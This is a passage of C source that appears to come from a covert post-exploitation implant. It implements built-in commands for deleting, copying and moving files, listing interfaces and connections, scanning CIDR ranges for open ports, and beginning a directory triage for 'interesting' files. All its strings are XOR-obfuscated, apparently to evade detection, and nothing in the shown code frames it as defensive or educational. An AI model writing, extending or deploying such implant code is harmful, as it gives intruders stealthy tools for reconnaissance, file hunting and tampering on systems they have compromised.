        return out_append(buf, buf_size, 0, "%s", fmt);
    }

    if (*p == '\0') {
        char fmt[ENC_LX_USAGE_RM_LEN + 1];
        xor_dec(fmt, ENC_LX_USAGE_RM, ENC_LX_USAGE_RM_LEN);
        return out_append(buf, buf_size, 0, "%s", fmt);
    }

    struct stat st;
    if (lstat(p, &st) != 0) {
        char fmt[ENC_LX_RM_ERR_LEN + 1];
        xor_dec(fmt, ENC_LX_RM_ERR, ENC_LX_RM_ERR_LEN);
        return out_append(buf, buf_size, 0, fmt, p, strerror(errno));
    }

    if (S_ISDIR(st.st_mode)) {
        if (!recursive) {
            char fmt[ENC_LX_RM_ISDIR_LEN + 1];
            xor_dec(fmt, ENC_LX_RM_ISDIR, ENC_LX_RM_ISDIR_LEN);
            return out_append(buf, buf_size, 0, fmt, p);
        }
        g_rm_errors = 0;
        nftw(p, rm_callback, 64, FTW_DEPTH | FTW_PHYS);
        if (g_rm_errors) {
            char fmt[ENC_LX_RM_PARTIAL_LEN + 1];
            xor_dec(fmt, ENC_LX_RM_PARTIAL, ENC_LX_RM_PARTIAL_LEN);
            return out_append(buf, buf_size, 0, fmt, p);
        }
    } else {
        if (unlink(p) != 0) {
            char fmt[ENC_LX_RM_ERR_LEN + 1];
            xor_dec(fmt, ENC_LX_RM_ERR, ENC_LX_RM_ERR_LEN);
            return out_append(buf, buf_size, 0, fmt, p, strerror(errno));
        }
    }
    char fmt[ENC_LX_REMOVED_LEN + 1];
    xor_dec(fmt, ENC_LX_REMOVED, ENC_LX_REMOVED_LEN);
    return out_append(buf, buf_size, 0, fmt, p);
}

/* -------------------------------------------------------------------------
 * 14. builtin_cp
 * ---------------------------------------------------------------------- */
static int builtin_cp(const char *args, char *buf, int buf_size) {
    const char *p = ltrim(args);
    if (*p == '\0') {
        char fmt[ENC_LX_USAGE_CP_LEN + 1];
        xor_dec(fmt, ENC_LX_USAGE_CP, ENC_LX_USAGE_CP_LEN);
        return out_append(buf, buf_size, 0, "%s", fmt);
    }

    const char *sp = strchr(p, ' ');
    if (!sp) {
        char fmt[ENC_LX_USAGE_CP_LEN + 1];
        xor_dec(fmt, ENC_LX_USAGE_CP, ENC_LX_USAGE_CP_LEN);
        return out_append(buf, buf_size, 0, "%s", fmt);
    }

    char src[4096], dst[4096];
    int slen = (int)(sp - p);
    if (slen >= (int)sizeof(src)) slen = (int)sizeof(src) - 1;
    memcpy(src, p, (size_t)slen); src[slen] = '\0';

    const char *dp = ltrim(sp);
    strncpy(dst, dp, sizeof(dst) - 1); dst[sizeof(dst) - 1] = '\0';
    int dlen = (int)strlen(dst);
    if (dlen > 0 && dst[dlen - 1] == '\n') dst[--dlen] = '\0';

    int src_fd = open(src, O_RDONLY);
    if (src_fd < 0) {
        char fmt[ENC_LX_CP_ERR_LEN + 1];
        xor_dec(fmt, ENC_LX_CP_ERR, ENC_LX_CP_ERR_LEN);
        return out_append(buf, buf_size, 0, fmt, src, strerror(errno));
    }

    struct stat st;
    if (fstat(src_fd, &st) != 0) {
        close(src_fd);
        char fmt[ENC_LX_CP_FSTAT_ERR_LEN + 1];
        xor_dec(fmt, ENC_LX_CP_FSTAT_ERR, ENC_LX_CP_FSTAT_ERR_LEN);
        return out_append(buf, buf_size, 0, fmt, src, strerror(errno));
    }

    int dst_fd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, st.st_mode & 07777);
    if (dst_fd < 0) {
        close(src_fd);
        char fmt[ENC_LX_CP_ERR_LEN + 1];
        xor_dec(fmt, ENC_LX_CP_ERR, ENC_LX_CP_ERR_LEN);
        return out_append(buf, buf_size, 0, fmt, dst, strerror(errno));
    }

    char tbuf[65536];
    ssize_t nr;
    long long total = 0;
    while ((nr = read(src_fd, tbuf, sizeof(tbuf))) > 0) {
        ssize_t nw = write(dst_fd, tbuf, (size_t)nr);
        if (nw != nr) {
            close(src_fd); close(dst_fd);
            char fmt[ENC_LX_CP_WRITE_ERR_LEN + 1];
            xor_dec(fmt, ENC_LX_CP_WRITE_ERR, ENC_LX_CP_WRITE_ERR_LEN);
            return out_append(buf, buf_size, 0, fmt, strerror(errno));
        }
        total += nr;
    }
    fchmod(dst_fd, st.st_mode & 07777);
    close(src_fd);
    close(dst_fd);

    char fmt[ENC_LX_COPIED_LEN + 1];
    xor_dec(fmt, ENC_LX_COPIED, ENC_LX_COPIED_LEN);
    return out_append(buf, buf_size, 0, fmt, src, dst, total);
}

/* -------------------------------------------------------------------------
 * 15. builtin_mv
 * ---------------------------------------------------------------------- */
static int builtin_mv(const char *args, char *buf, int buf_size) {
    const char *p = ltrim(args);
    if (*p == '\0') {
        char fmt[ENC_LX_USAGE_MV_LEN + 1];
        xor_dec(fmt, ENC_LX_USAGE_MV, ENC_LX_USAGE_MV_LEN);
        return out_append(buf, buf_size, 0, "%s", fmt);
    }

    const char *sp = strchr(p, ' ');
    if (!sp) {
        char fmt[ENC_LX_USAGE_MV_LEN + 1];
        xor_dec(fmt, ENC_LX_USAGE_MV, ENC_LX_USAGE_MV_LEN);
        return out_append(buf, buf_size, 0, "%s", fmt);
    }

    char src[4096], dst[4096];
    int slen = (int)(sp - p);
    if (slen >= (int)sizeof(src)) slen = (int)sizeof(src) - 1;
    memcpy(src, p, (size_t)slen); src[slen] = '\0';

    const char *dp = ltrim(sp);
    strncpy(dst, dp, sizeof(dst) - 1); dst[sizeof(dst) - 1] = '\0';
    int dlen = (int)strlen(dst);
    if (dlen > 0 && dst[dlen - 1] == '\n') dst[--dlen] = '\0';

    if (rename(src, dst) == 0) {
        char fmt[ENC_LX_MOVED_LEN + 1];
        xor_dec(fmt, ENC_LX_MOVED, ENC_LX_MOVED_LEN);
        return out_append(buf, buf_size, 0, fmt, src, dst);
    }

    if (errno != EXDEV) {
        char fmt[ENC_LX_MV_ERR_LEN + 1];
        xor_dec(fmt, ENC_LX_MV_ERR, ENC_LX_MV_ERR_LEN);
        return out_append(buf, buf_size, 0, fmt, src, dst, strerror(errno));
    }

    /* cross-device: copy then unlink */
    char tmp_buf[256];
    int r = builtin_cp(args, tmp_buf, sizeof(tmp_buf));
    (void)r;
    char copied_tag[ENC_LX_COPIED_COLON_LEN + 1];
    xor_dec(copied_tag, ENC_LX_COPIED_COLON, ENC_LX_COPIED_COLON_LEN);
    if (strncmp(tmp_buf, copied_tag, ENC_LX_COPIED_COLON_LEN) == 0) {
        unlink(src);
        char fmt[ENC_LX_MOVED_LEN + 1];
        xor_dec(fmt, ENC_LX_MOVED, ENC_LX_MOVED_LEN);
        return out_append(buf, buf_size, 0, fmt, src, dst);
    }
    char fmt[ENC_LX_MV_XDEV_LEN + 1];
    xor_dec(fmt, ENC_LX_MV_XDEV, ENC_LX_MV_XDEV_LEN);
    return out_append(buf, buf_size, 0, fmt, tmp_buf);
}

/* -------------------------------------------------------------------------
 * 16. builtin_ifconfig
 * ---------------------------------------------------------------------- */

static int mask_to_prefix(uint32_t mask) {
    int bits = 0;
    mask = ntohl(mask);
    while (mask & 0x80000000u) { bits++; mask <<= 1; }
    return bits;
}

static int builtin_ifconfig(char *buf, int buf_size) {
    int pos = 0;
    struct ifaddrs *ifap = NULL;
    if (getifaddrs(&ifap) != 0) {
        char fmt[ENC_LX_IFCONFIG_ERR_LEN + 1];
        xor_dec(fmt, ENC_LX_IFCONFIG_ERR, ENC_LX_IFCONFIG_ERR_LEN);
        return out_append(buf, buf_size, 0, fmt, strerror(errno));
    }

    /* decode format strings once */
    char fmt_inet[ENC_LX_INET_LEN + 1];
    xor_dec(fmt_inet, ENC_LX_INET, ENC_LX_INET_LEN);
    char fmt_inet6[ENC_LX_INET6_LEN + 1];
    xor_dec(fmt_inet6, ENC_LX_INET6, ENC_LX_INET6_LEN);
    char fmt_ether[ENC_LX_ETHER_LEN + 1];
    xor_dec(fmt_ether, ENC_LX_ETHER, ENC_LX_ETHER_LEN);
    char fmt_flags[ENC_LX_FLAGS_LEN + 1];
    xor_dec(fmt_flags, ENC_LX_FLAGS, ENC_LX_FLAGS_LEN);
    char flag_up[ENC_LX_FLAG_UP_LEN + 1];
    xor_dec(flag_up, ENC_LX_FLAG_UP, ENC_LX_FLAG_UP_LEN);
    char flag_running[ENC_LX_FLAG_RUNNING_LEN + 1];
    xor_dec(flag_running, ENC_LX_FLAG_RUNNING, ENC_LX_FLAG_RUNNING_LEN);
    char flag_loop[ENC_LX_FLAG_LOOP_LEN + 1];
    xor_dec(flag_loop, ENC_LX_FLAG_LOOP, ENC_LX_FLAG_LOOP_LEN);
    char sys_net_fmt[ENC_LX_SYS_NET_ADDR_LEN + 1];
    xor_dec(sys_net_fmt, ENC_LX_SYS_NET_ADDR, ENC_LX_SYS_NET_ADDR_LEN);

    /* collect unique interface names */
    char ifaces[64][IFNAMSIZ];
    int nifaces = 0;

    for (struct ifaddrs *ifa = ifap; ifa != NULL; ifa = ifa->ifa_next) {
        if (!ifa->ifa_name) continue;
        int found = 0;
        for (int i = 0; i < nifaces; i++)
            if (strncmp(ifaces[i], ifa->ifa_name, IFNAMSIZ) == 0) { found = 1; break; }
        if (!found && nifaces < 64)
            strncpy(ifaces[nifaces++], ifa->ifa_name, IFNAMSIZ - 1);
    }

    for (int i = 0; i < nifaces; i++) {
        pos = out_append(buf, buf_size, pos, "%s:\n", ifaces[i]);

        unsigned int flags = 0;
        for (struct ifaddrs *ifa = ifap; ifa; ifa = ifa->ifa_next) {
            if (ifa->ifa_name && strncmp(ifa->ifa_name, ifaces[i], IFNAMSIZ) == 0) {
                flags = ifa->ifa_flags;
                break;
            }
        }

        for (struct ifaddrs *ifa = ifap; ifa; ifa = ifa->ifa_next) {
            if (!ifa->ifa_name || strncmp(ifa->ifa_name, ifaces[i], IFNAMSIZ) != 0) continue;
            if (!ifa->ifa_addr) continue;

            if (ifa->ifa_addr->sa_family == AF_INET) {
                char ipstr[INET_ADDRSTRLEN];
                struct sockaddr_in *sa = (struct sockaddr_in *)ifa->ifa_addr;
                inet_ntop(AF_INET, &sa->sin_addr, ipstr, sizeof(ipstr));
                int prefix = 0;
                if (ifa->ifa_netmask) {
                    struct sockaddr_in *nm = (struct sockaddr_in *)ifa->ifa_netmask;
                    prefix = mask_to_prefix(nm->sin_addr.s_addr);
                }
                pos = out_append(buf, buf_size, pos, fmt_inet, ipstr, prefix);
            } else if (ifa->ifa_addr->sa_family == AF_INET6) {
                char ipstr[INET6_ADDRSTRLEN];
                struct sockaddr_in6 *sa6 = (struct sockaddr_in6 *)ifa->ifa_addr;
                inet_ntop(AF_INET6, &sa6->sin6_addr, ipstr, sizeof(ipstr));
                int prefix6 = 0;
                if (ifa->ifa_netmask) {
                    struct sockaddr_in6 *nm6 = (struct sockaddr_in6 *)ifa->ifa_netmask;
                    for (int b = 0; b < 16; b++) {
                        uint8_t byte = nm6->sin6_addr.s6_addr[b];
                        while (byte & 0x80) { prefix6++; byte <<= 1; }
                    }
                }
                pos = out_append(buf, buf_size, pos, fmt_inet6, ipstr, prefix6);
            }
        }

        /* MAC from /sys/class/net/<iface>/address */
        char mac_path[128];
        snprintf(mac_path, sizeof(mac_path), sys_net_fmt, ifaces[i]);
        char mac_buf[24] = {0};
        if (read_small_file(mac_path, mac_buf, sizeof(mac_buf)) > 0)
            pos = out_append(buf, buf_size, pos, fmt_ether, mac_buf);

        pos = out_append(buf, buf_size, pos, "%s", fmt_flags);
        if (flags & IFF_UP)       pos = out_append(buf, buf_size, pos, "%s", flag_up);
        if (flags & IFF_RUNNING)  pos = out_append(buf, buf_size, pos, "%s", flag_running);
        if (flags & IFF_LOOPBACK) pos = out_append(buf, buf_size, pos, "%s", flag_loop);
        pos = out_append(buf, buf_size, pos, "\n");
    }

    freeifaddrs(ifap);
    return pos;
}

/* -------------------------------------------------------------------------
 * 17. builtin_netstat
 * ---------------------------------------------------------------------- */

static const char *tcp_state_name(int s) {
    /* decode all state names into static buffers (sequential, single-threaded) */
    static char st_buf[12][32];
    static int decoded = 0;
    if (!decoded) {
        xor_dec(st_buf[0],  ENC_LX_ST_ESTABLISHED, ENC_LX_ST_ESTABLISHED_LEN);
        xor_dec(st_buf[1],  ENC_LX_ST_SYN_SENT,    ENC_LX_ST_SYN_SENT_LEN);
        xor_dec(st_buf[2],  ENC_LX_ST_SYN_RECV,    ENC_LX_ST_SYN_RECV_LEN);
        xor_dec(st_buf[3],  ENC_LX_ST_FIN_WAIT1,   ENC_LX_ST_FIN_WAIT1_LEN);
        xor_dec(st_buf[4],  ENC_LX_ST_FIN_WAIT2,   ENC_LX_ST_FIN_WAIT2_LEN);
        xor_dec(st_buf[5],  ENC_LX_ST_TIME_WAIT,   ENC_LX_ST_TIME_WAIT_LEN);
        xor_dec(st_buf[6],  ENC_LX_ST_CLOSE,       ENC_LX_ST_CLOSE_LEN);
        xor_dec(st_buf[7],  ENC_LX_ST_CLOSE_WAIT,  ENC_LX_ST_CLOSE_WAIT_LEN);
        xor_dec(st_buf[8],  ENC_LX_ST_LAST_ACK,    ENC_LX_ST_LAST_ACK_LEN);
        xor_dec(st_buf[9],  ENC_LX_ST_LISTEN,      ENC_LX_ST_LISTEN_LEN);
        xor_dec(st_buf[10], ENC_LX_ST_CLOSING,     ENC_LX_ST_CLOSING_LEN);
        xor_dec(st_buf[11], ENC_LX_ST_UNKNOWN,     ENC_LX_ST_UNKNOWN_LEN);
        decoded = 1;
    }
    switch (s) {
        case 0x01: return st_buf[0];
        case 0x02: return st_buf[1];
        case 0x03: return st_buf[2];
        case 0x04: return st_buf[3];
        case 0x05: return st_buf[4];
        case 0x06: return st_buf[5];
        case 0x07: return st_buf[6];
        case 0x08: return st_buf[7];
        case 0x09: return st_buf[8];
        case 0x0A: return st_buf[9];
        case 0x0B: return st_buf[10];
        default:   return st_buf[11];
    }
}

static void hex_ip_to_str(const char *hex, char *out) {
    unsigned long val = strtoul(hex, NULL, 16);
    unsigned char a = (unsigned char)((val >>  0) & 0xFF);
    unsigned char b = (unsigned char)((val >>  8) & 0xFF);
    unsigned char c = (unsigned char)((val >> 16) & 0xFF);
    unsigned char d = (unsigned char)((val >> 24) & 0xFF);
    snprintf(out, 16, "%d.%d.%d.%d", a, b, c, d);
}

static int find_pid_for_inode(unsigned long inode) {
    if (getuid() != 0) return -1;

    char proc_path[ENC_LX_PROC_LEN + 1];
    xor_dec(proc_path, ENC_LX_PROC, ENC_LX_PROC_LEN);

    DIR *pdir = opendir(proc_path);
    if (!pdir) return -1;

    char sock_fmt[ENC_LX_SOCKET_INODE_LEN + 1];
    xor_dec(sock_fmt, ENC_LX_SOCKET_INODE, ENC_LX_SOCKET_INODE_LEN);
    char target[64];
    snprintf(target, sizeof(target), sock_fmt, inode);

    char fd_fmt[ENC_LX_PROC_PID_FD_LEN + 1];
    xor_dec(fd_fmt, ENC_LX_PROC_PID_FD, ENC_LX_PROC_PID_FD_LEN);
    char fdent_fmt[ENC_LX_PROC_PID_FD_ENT_LEN + 1];
    xor_dec(fdent_fmt, ENC_LX_PROC_PID_FD_ENT, ENC_LX_PROC_PID_FD_ENT_LEN);

    int found_pid = -1;
    struct dirent *de;
    while ((de = readdir(pdir)) != NULL && found_pid < 0) {
        if (de->d_name[0] < '1' || de->d_name[0] > '9') continue;
        char *ep = NULL;
        long pid_num = strtol(de->d_name, &ep, 10);
        if (!ep || *ep != '\0') continue;

        char fd_path[128];
        snprintf(fd_path, sizeof(fd_path), fd_fmt, pid_num);
        DIR *fdir = opendir(fd_path);
        if (!fdir) continue;

        struct dirent *fde;
        while ((fde = readdir(fdir)) != NULL) {
            if (fde->d_name[0] == '.') continue;
            char link_path[192];
            snprintf(link_path, sizeof(link_path), fdent_fmt, pid_num, fde->d_name);
            char link_buf[128] = {0};
            ssize_t lr = readlink(link_path, link_buf, sizeof(link_buf) - 1);
            if (lr > 0) {
                link_buf[lr] = '\0';
                if (strcmp(link_buf, target) == 0) {
                    found_pid = (int)pid_num;
                    break;
                }
            }
        }
        closedir(fdir);
    }
    closedir(pdir);
    return found_pid;
}

static void get_comm(int pid, char *out, int out_size) {
    char comm_fmt[ENC_LX_PROC_PID_COMM_LEN + 1];
    xor_dec(comm_fmt, ENC_LX_PROC_PID_COMM, ENC_LX_PROC_PID_COMM_LEN);
    char path[64];
    snprintf(path, sizeof(path), comm_fmt, pid);
    if (read_small_file(path, out, out_size) <= 0)
        strncpy(out, "?", (size_t)(out_size - 1));
}

static int parse_net_file(const char *proto, const char *netfile,
                           char *buf, int buf_size, int pos) {
    int fd = open(netfile, O_RDONLY);
    if (fd < 0) return pos;

    char rbuf[65536];
    ssize_t n = read(fd, rbuf, sizeof(rbuf) - 1);
    close(fd);
    if (n <= 0) return pos;
    rbuf[n] = '\0';

    char *line = rbuf;
    int first_line = 1;
    while (line && *line) {
        char *nl = strchr(line, '\n');
        if (nl) *nl = '\0';
        if (first_line) { first_line = 0; line = nl ? nl + 1 : NULL; continue; }

        char sl[16], local[32], rem[32], state_hex[8];
        char unused1[32], unused2[16], unused3[16], unused4[16];
        char uid_str[16], unused5[16], inode_str[32];

        int fields = sscanf(line,
            "%15s %31s %31s %7s %31s %15s %15s %15s %15s %15s %31s",
            sl, local, rem, state_hex,
            unused1, unused2, unused3, unused4,
            uid_str, unused5, inode_str);

        if (fields < 11) { line = nl ? nl + 1 : NULL; continue; }

        char *colon_l = strchr(local, ':');
        char local_ip[20] = "?", local_port_str[8] = "?";
        if (colon_l) {
            *colon_l = '\0';
            hex_ip_to_str(local, local_ip);
            unsigned int lp = (unsigned int)strtoul(colon_l + 1, NULL, 16);
            snprintf(local_port_str, sizeof(local_port_str), "%u", lp);
        }

        char *colon_r = strchr(rem, ':');
        char rem_ip[20] = "?", rem_port_str[8] = "*";
        if (colon_r) {
            *colon_r = '\0';
            hex_ip_to_str(rem, rem_ip);
            unsigned int rp = (unsigned int)strtoul(colon_r + 1, NULL, 16);
            if (rp == 0) strncpy(rem_port_str, "*", sizeof(rem_port_str) - 1);
            else snprintf(rem_port_str, sizeof(rem_port_str), "%u", rp);
        }

        int state_int = (int)strtol(state_hex, NULL, 16);
        const char *state_name = tcp_state_name(state_int);

        unsigned long inode_num = strtoul(inode_str, NULL, 10);
        int owner_pid = find_pid_for_inode(inode_num);
        char pname[32] = "-";
        if (owner_pid > 0) get_comm(owner_pid, pname, sizeof(pname));

        char local_full[28], rem_full[28];
        snprintf(local_full, sizeof(local_full), "%s:%s", local_ip, local_port_str);
        snprintf(rem_full,   sizeof(rem_full),   "%s:%s", rem_ip,   rem_port_str);

        if (owner_pid > 0)
            pos = out_append(buf, buf_size, pos,
                "%-5s  %-22s %-22s %-13s %-6d %s\n",
                proto, local_full, rem_full, state_name, owner_pid, pname);
        else
            pos = out_append(buf, buf_size, pos,
                "%-5s  %-22s %-22s %-13s %-6s %s\n",
                proto, local_full, rem_full, state_name, "-", pname);

        line = nl ? nl + 1 : NULL;
    }
    return pos;
}

static int builtin_netstat(char *buf, int buf_size) {
    int pos = 0;

    char h_proto[ENC_LX_NETSTAT_HDR_LEN + 1];
    xor_dec(h_proto, ENC_LX_NETSTAT_HDR, ENC_LX_NETSTAT_HDR_LEN);
    char h_local[ENC_LX_NETSTAT_LOCAL_LEN + 1];
    xor_dec(h_local, ENC_LX_NETSTAT_LOCAL, ENC_LX_NETSTAT_LOCAL_LEN);
    char h_remote[ENC_LX_NETSTAT_REMOTE_LEN + 1];
    xor_dec(h_remote, ENC_LX_NETSTAT_REMOTE, ENC_LX_NETSTAT_REMOTE_LEN);
    char h_state[ENC_LX_NETSTAT_STATE_LEN + 1];
    xor_dec(h_state, ENC_LX_NETSTAT_STATE, ENC_LX_NETSTAT_STATE_LEN);
    char h_pid[ENC_LX_NETSTAT_PID_LEN + 1];
    xor_dec(h_pid, ENC_LX_NETSTAT_PID, ENC_LX_NETSTAT_PID_LEN);
    char h_proc[ENC_LX_NETSTAT_PROC_LEN + 1];
    xor_dec(h_proc, ENC_LX_NETSTAT_PROC, ENC_LX_NETSTAT_PROC_LEN);

    pos = out_append(buf, buf_size, pos,
        "%-5s  %-22s %-22s %-13s %-6s %s\n",
        h_proto, h_local, h_remote, h_state, h_pid, h_proc);

    char p_tcp[ENC_LX_PROTO_TCP_LEN + 1];
    xor_dec(p_tcp, ENC_LX_PROTO_TCP, ENC_LX_PROTO_TCP_LEN);
    char p_tcp6[ENC_LX_PROTO_TCP6_LEN + 1];
    xor_dec(p_tcp6, ENC_LX_PROTO_TCP6, ENC_LX_PROTO_TCP6_LEN);
    char p_udp[ENC_LX_PROTO_UDP_LEN + 1];
    xor_dec(p_udp, ENC_LX_PROTO_UDP, ENC_LX_PROTO_UDP_LEN);
    char p_udp6[ENC_LX_PROTO_UDP6_LEN + 1];
    xor_dec(p_udp6, ENC_LX_PROTO_UDP6, ENC_LX_PROTO_UDP6_LEN);

    char f_tcp[ENC_LX_PROC_NET_TCP_LEN + 1];
    xor_dec(f_tcp, ENC_LX_PROC_NET_TCP, ENC_LX_PROC_NET_TCP_LEN);
    char f_tcp6[ENC_LX_PROC_NET_TCP6_LEN + 1];
    xor_dec(f_tcp6, ENC_LX_PROC_NET_TCP6, ENC_LX_PROC_NET_TCP6_LEN);
    char f_udp[ENC_LX_PROC_NET_UDP_LEN + 1];
    xor_dec(f_udp, ENC_LX_PROC_NET_UDP, ENC_LX_PROC_NET_UDP_LEN);
    char f_udp6[ENC_LX_PROC_NET_UDP6_LEN + 1];
    xor_dec(f_udp6, ENC_LX_PROC_NET_UDP6, ENC_LX_PROC_NET_UDP6_LEN);

    pos = parse_net_file(p_tcp,  f_tcp,  buf, buf_size, pos);
    pos = parse_net_file(p_tcp6, f_tcp6, buf, buf_size, pos);
    pos = parse_net_file(p_udp,  f_udp,  buf, buf_size, pos);
    pos = parse_net_file(p_udp6, f_udp6, buf, buf_size, pos);
    return pos;
}

/* -------------------------------------------------------------------------
 * 18. builtin_portscan
 * ---------------------------------------------------------------------- */

#define PORTSCAN_MAX_FDS 20
#define PORTSCAN_TIMEOUT_SEC 2

typedef struct {
    int       fd;
    uint32_t  ip;
    uint16_t  port;
    int       used;
} ScanSlot;

static int check_slot_connected(ScanSlot *s) {
    fd_set wfds;
    FD_ZERO(&wfds);
    FD_SET(s->fd, &wfds);
    struct timeval tv = { 0, 0 };
    int r = select(s->fd + 1, NULL, &wfds, NULL, &tv);
    if (r <= 0) return 0;
    int sockerr = 0;
    socklen_t errlen = sizeof(sockerr);
    getsockopt(s->fd, SOL_SOCKET, SO_ERROR, &sockerr, &errlen);
    return (sockerr == 0) ? 1 : 0;
}

static int expand_cidr(const char *cidr, uint32_t **ips) {
    char host_part[64] = {0};
    int prefix = 32;
    const char *slash = strchr(cidr, '/');
    if (slash) {
        int hlen = (int)(slash - cidr);
        if (hlen >= 63) hlen = 63;
        memcpy(host_part, cidr, (size_t)hlen);
        host_part[hlen] = '\0';
        prefix = atoi(slash + 1);
    } else {
        strncpy(host_part, cidr, sizeof(host_part) - 1);
    }
    if (prefix < 0) prefix = 0;
    if (prefix > 32) prefix = 32;

    struct in_addr addr;
    if (inet_aton(host_part, &addr) == 0) return 0;

    uint32_t base = ntohl(addr.s_addr);

    if (prefix == 32) {
        *ips = malloc(sizeof(uint32_t));
        if (!*ips) return 0;
        (*ips)[0] = htonl(base);
        return 1;
    }

    uint32_t mask = (prefix == 0) ? 0 : (~0u << (32 - prefix));
    uint32_t network = base & mask;
    uint32_t count = ~mask;

    if (count > 1024) count = 1024;

    *ips = malloc(count * sizeof(uint32_t));
    if (!*ips) return 0;

    uint32_t n = 0;
    for (uint32_t h = 1; h < count; h++) {
        (*ips)[n++] = htonl(network + h);
    }
    return (int)n;
}

static int parse_ports(const char *spec, uint16_t **ports) {
    int cap = 64;
    *ports = malloc((size_t)cap * sizeof(uint16_t));
    if (!*ports) return 0;
    int count = 0;

    char buf_copy[4096];
    strncpy(buf_copy, spec, sizeof(buf_copy) - 1);
    buf_copy[sizeof(buf_copy) - 1] = '\0';

    char *tok = strtok(buf_copy, ",");
    while (tok) {
        char *dash = strchr(tok, '-');
        if (dash) {
            int lo = atoi(tok);
            int hi = atoi(dash + 1);
            if (lo < 1) lo = 1;
            if (hi > 65535) hi = 65535;
            for (int p = lo; p <= hi; p++) {
                if (count >= cap) {
                    cap *= 2;
                    uint16_t *np = realloc(*ports, (size_t)cap * sizeof(uint16_t));
                    if (!np) goto done;
                    *ports = np;
                }
                (*ports)[count++] = (uint16_t)p;
            }
        } else {
            int pnum = atoi(tok);
            if (pnum >= 1 && pnum <= 65535) {
                if (count >= cap) {
                    cap *= 2;
                    uint16_t *np = realloc(*ports, (size_t)cap * sizeof(uint16_t));
                    if (!np) goto done;
                    *ports = np;
                }
                (*ports)[count++] = (uint16_t)pnum;
            }
        }
        tok = strtok(NULL, ",");
    }
done:
    return count;
}

static int builtin_portscan(const char *args, char *buf, int buf_size) {
    int pos = 0;
    const char *p = ltrim(args);
    if (*p == '\0') {
        char fmt1[ENC_LX_USAGE_PORTSCAN_LEN + 1];
        xor_dec(fmt1, ENC_LX_USAGE_PORTSCAN, ENC_LX_USAGE_PORTSCAN_LEN);
        char fmt2[ENC_LX_USAGE_PORTSCAN2_LEN + 1];
        xor_dec(fmt2, ENC_LX_USAGE_PORTSCAN2, ENC_LX_USAGE_PORTSCAN2_LEN);
        pos = out_append(buf, buf_size, 0, "%s%s", fmt1, fmt2);
        return pos;
    }

    const char *sp = strchr(p, ' ');
    if (!sp) {
        char fmt[ENC_LX_USAGE_PORTSCAN_LEN + 1];
        xor_dec(fmt, ENC_LX_USAGE_PORTSCAN, ENC_LX_USAGE_PORTSCAN_LEN);
        return out_append(buf, buf_size, 0, "%s", fmt);
    }

    char host_spec[128] = {0};
    int hslen = (int)(sp - p);
    if (hslen >= (int)sizeof(host_spec)) hslen = (int)sizeof(host_spec) - 1;
    memcpy(host_spec, p, (size_t)hslen);
    host_spec[hslen] = '\0';

    const char *port_spec = ltrim(sp);

    uint32_t *ips   = NULL;
    uint16_t *ports = NULL;
    int nips   = expand_cidr(host_spec, &ips);
    int nports = parse_ports(port_spec, &ports);

    if (nips == 0 || nports == 0) {
        free(ips); free(ports);
        char fmt[ENC_LX_PORTSCAN_INVAL_LEN + 1];
        xor_dec(fmt, ENC_LX_PORTSCAN_INVAL, ENC_LX_PORTSCAN_INVAL_LEN);
        return out_append(buf, buf_size, 0, "%s", fmt);
    }

    char open_fmt[ENC_LX_PORT_OPEN_LEN + 1];
    xor_dec(open_fmt, ENC_LX_PORT_OPEN, ENC_LX_PORT_OPEN_LEN);

    int open_count = 0;
    ScanSlot slots[PORTSCAN_MAX_FDS];
    memset(slots, 0, sizeof(slots));

    long total_work = (long)nips * nports;
    long work_idx   = 0;
    int  ip_i   = 0;
    int  port_i = 0;

    while (work_idx < total_work || ({
            int _any = 0;
            for (int _i = 0; _i < PORTSCAN_MAX_FDS; _i++) if (slots[_i].used) { _any = 1; break; }
            _any; })) {

        while (work_idx < total_work) {
            int free_slot = -1;
            for (int s = 0; s < PORTSCAN_MAX_FDS; s++)
                if (!slots[s].used) { free_slot = s; break; }
            if (free_slot < 0) break;

            uint32_t cur_ip   = ips[ip_i];
            uint16_t cur_port = ports[port_i];

            port_i++;
            if (port_i >= nports) { port_i = 0; ip_i++; }
            work_idx++;

            int fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd < 0) continue;

            int flags = fcntl(fd, F_GETFL, 0);
            fcntl(fd, F_SETFL, flags | O_NONBLOCK);

            struct sockaddr_in sa;
            memset(&sa, 0, sizeof(sa));
            sa.sin_family      = AF_INET;
            sa.sin_port        = htons(cur_port);
            sa.sin_addr.s_addr = cur_ip;

            int r = connect(fd, (struct sockaddr *)&sa, sizeof(sa));
            if (r == 0) {
                char ipstr[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &cur_ip, ipstr, sizeof(ipstr));
                pos = out_append(buf, buf_size, pos, open_fmt, ipstr, cur_port);
                open_count++;
                close(fd);
                continue;
            }
            if (errno != EINPROGRESS) { close(fd); continue; }

            slots[free_slot].fd   = fd;
            slots[free_slot].ip   = cur_ip;
            slots[free_slot].port = cur_port;
            slots[free_slot].used = 1;
        }

        fd_set wfds;
        FD_ZERO(&wfds);
        int max_fd = -1;
        for (int s = 0; s < PORTSCAN_MAX_FDS; s++) {
            if (slots[s].used) {
                FD_SET(slots[s].fd, &wfds);
                if (slots[s].fd > max_fd) max_fd = slots[s].fd;
            }
        }
        if (max_fd < 0) continue;

        struct timeval tv = { PORTSCAN_TIMEOUT_SEC, 0 };
        select(max_fd + 1, NULL, &wfds, NULL, &tv);

        for (int s = 0; s < PORTSCAN_MAX_FDS; s++) {
            if (!slots[s].used) continue;
            if (FD_ISSET(slots[s].fd, &wfds)) {
                if (check_slot_connected(&slots[s])) {
                    char ipstr[INET_ADDRSTRLEN];
                    inet_ntop(AF_INET, &slots[s].ip, ipstr, sizeof(ipstr));
                    pos = out_append(buf, buf_size, pos, open_fmt, ipstr, slots[s].port);
                    open_count++;
                }
                close(slots[s].fd);
                slots[s].used = 0;
            } else {
                close(slots[s].fd);
                slots[s].used = 0;
            }
        }
    }

    free(ips);
    free(ports);
    char scan_fmt[ENC_LX_SCAN_COMPLETE_LEN + 1];
    xor_dec(scan_fmt, ENC_LX_SCAN_COMPLETE, ENC_LX_SCAN_COMPLETE_LEN);
    pos = out_append(buf, buf_size, pos, scan_fmt, open_count, nips);
    return pos;
}

/* -------------------------------------------------------------------------
 * 19. builtin_triagedirectory
 * ---------------------------------------------------------------------- */

#define TRIAGE_CATS 10

typedef struct {
    char   path[512];
    off_t  size;
    time_t mtime;
    int    cat;
} TriageHit;

static TriageHit *g_triage_hits = NULL;
static int        g_triage_count = 0;
static int        g_triage_cap   = 0;

/* Return category index for a path, or -1 if not interesting */
